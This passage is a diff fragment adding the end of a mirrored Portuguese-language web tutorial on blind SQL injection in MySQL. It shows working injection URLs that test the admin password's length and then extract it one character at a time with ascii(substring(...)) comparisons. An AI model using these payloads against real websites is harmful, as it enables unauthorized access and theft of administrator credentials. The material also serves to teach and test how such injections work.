+http://www.site.com/index.php?id=10 AND(SELECT length(password) FROM admin where id=1)=8 //TRUE</code></pre>
+                    <li><span>Bom, já que sabemos quantos caracteres a senha do administrador possue nós demos que adivinhar os caracteres um por um, no método antigo mesmo do <strong>BLIND SQLI Mysql</strong></span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND ascii(substring((SELECT concat(password) from admin limit 0,1),1,1))=102 &lt;== TRUE</code></pre>
+                    <li><span>PEGANDO O SEGUNDO CARACTERE:</span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND ascii(substring((SELECT concat(password) from admin limit 0,1),2,1))=121 &lt;== TRUE</code></pre>
+                    <li><span>E assim por diante...</span></li>
+                </ul>
+        </fieldset>
+    <script>new Highlighter().run(document);</script
+    </div>
+    </body>
+
+<!-- Mirrored from f3l1p3.neocities.org/arquivos/sqlinjection by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 05 Oct 2025 19:28:13 GMT -->
+</html>
